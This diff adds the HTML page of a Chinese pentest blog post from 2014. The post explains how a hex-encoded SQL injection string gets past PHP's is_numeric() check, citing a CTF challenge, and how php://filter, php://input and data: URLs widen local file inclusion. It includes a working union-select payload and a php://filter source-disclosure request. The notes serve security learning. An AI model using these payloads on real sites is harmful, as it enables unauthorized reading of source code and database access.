@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>is_numeric() &amp; php://filter | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="is_numeric()可通过16 进制或2 进制编码绕过，导致二次注入。 如 hackyou2014 CTF web100 中可通过构造
+1-1 union select user() ==&amp;gt; 0x2d3120756e696f6e2073656c65637420757365722829
+进行注入。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="is_numeric() & php://filter">
+<meta property="og:url" content="http://sh3ll.me/2014/03/14/php-is-numeric-filter/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="is_numeric()可通过16 进制或2 进制编码绕过，导致二次注入。 如 hackyou2014 CTF web100 中可通过构造
+1-1 union select user() ==&amp;gt; 0x2d3120756e696f6e2073656c65637420757365722829
+进行注入。">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="is_numeric() & php://filter">
+<meta name="twitter:description" content="is_numeric()可通过16 进制或2 进制编码绕过，导致二次注入。 如 hackyou2014 CTF web100 中可通过构造
+1-1 union select user() ==&amp;gt; 0x2d3120756e696f6e2073656c65637420757365722829
+进行注入。">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-php-is-numeric-filter" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      is_numeric() &amp; php://filter
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-03-14T15:17:19.000Z" itemprop="datePublished">03-14-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p>可通过16 进制或2 进制编码绕过，导致二次注入。 如 hackyou2014 CTF web100 中可通过构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1 union select user() ==&gt; 0x2d3120756e696f6e2073656c65637420757365722829</div></pre></td></tr></table></figure>
+<p>进行注入。<a id="more"></a></p>
+<h2 id="php-filter-php-input-data-URL-schema-让-LFI-发挥更大作用"><a href="#php-filter-php-input-data-URL-schema-让-LFI-发挥更大作用" class="headerlink" title="php://filter, php://input, data URL schema 让 LFI 发挥更大作用"></a>php://filter, php://input, data URL schema 让 LFI 发挥更大作用</h2><p>php://filter 可用来读取文件源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure>
+<p>php://input，data URL schema 可用来执行 php 代码，但是要求 allow_url_include 为 On（默认为 Off），有些鸡肋。</p>
+<p>References:</p>
+<ul>
+<li><a href="http://drops.wooyun.org/tips/870" target="_blank" rel="external">http://drops.wooyun.org/tips/870</a></li>
+<li><a href="http://www.91ri.org/7469.html" target="_blank" rel="external">http://www.91ri.org/7469.html</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/03/14/php-is-numeric-filter/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/03/26/hack-moonsec/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          某黑客站
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/03/13/hack-worm-evilsay/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">worm.cc &amp; evilsay.cc</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/03/14/php-is-numeric-filter/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
